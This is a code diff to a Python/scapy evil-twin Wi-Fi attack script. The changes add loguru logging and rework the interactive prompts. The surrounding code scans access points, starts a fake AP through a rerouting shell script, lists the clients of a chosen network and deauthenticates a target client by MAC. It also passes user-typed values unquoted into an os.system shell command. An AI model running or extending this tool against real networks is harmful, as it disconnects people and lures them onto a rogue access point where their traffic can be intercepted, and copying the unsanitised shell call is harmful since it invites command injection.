@@ -8,6 +8,7 @@ import pandas
 import time
 import pdb
 import os
+from loguru import logger
 
 # initialize the networks dataframe that will contain all access points nearby
 networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
@@ -43,7 +44,8 @@ def callback(packet):
 def print_APs():
     while isPrinting:
         os.system("clear")
-        print(networks)
+        logger.info("Start scanning networks...")
+        logger.info(networks)
         time.sleep(0.5)
 
 
@@ -91,7 +93,9 @@ def deauth_target(target_mac, twin_mac):
 
 
 if __name__ == "__main__":
+
     conf.iface = os.getenv("ATTACK_INTERFACE")
+    logger.info(f"using interface: {conf.iface}")
 
     # start the thread that prints all the networks
     printer = Thread(target=print_APs)
@@ -100,27 +104,31 @@ if __name__ == "__main__":
     # start the channel changer
     channel_changer = Thread(target=change_channel)
     channel_changer.start()
-    print("Start scanning networks")
     # start sniffing
     sniff(prn=callback, monitor=True, timeout=10)
     isPrinting = False
 
-    print("Enter ssid address of AP to scan: ")
+    logger.info("Please choose a network (SSID) to scan clients from: ")
 
     ssid_to_scan = input()
     bssid_to_scan = networks[networks["SSID"] == ssid_to_scan].index[0]
 
+    logger.info("please insert a wifi interface name for the fake AP: ")
+    fake_ap = input()
+    logger.info("please insert a wifi interface name with working net connection: ")
+    net_ap = input()
 
-    fake_ap = input("please insert a wifi interface name for the fake AP: ")
-    net_ap = input("please insert a wifi interface name with working net connection: ")
+
     os.system(f"./rerouting_magic.sh --ap {fake_ap} --net {net_ap} --ssid {ssid_to_scan}")
 
-    print(f'Start scanning clients on {bssid_to_scan}')
+    logger.info(f'Start scanning clients on {bssid_to_scan}')
     sniff(prn=get_AP_clients, monitor=True, timeout=20)
     isSniffing = False
 
-    print(f"clients connected to the AP you choose: {clients}")
+    logger.info(f"clients connected to the AP you choose: {clients}")
+    logger.info("please choose a client MAC to deauth: ")
+    target_mac = input()
 
-    target_mac = input("Enter target mac: ")
     deauth_target(target_mac, bssid_to_scan)
+    
     pdb.set_trace()
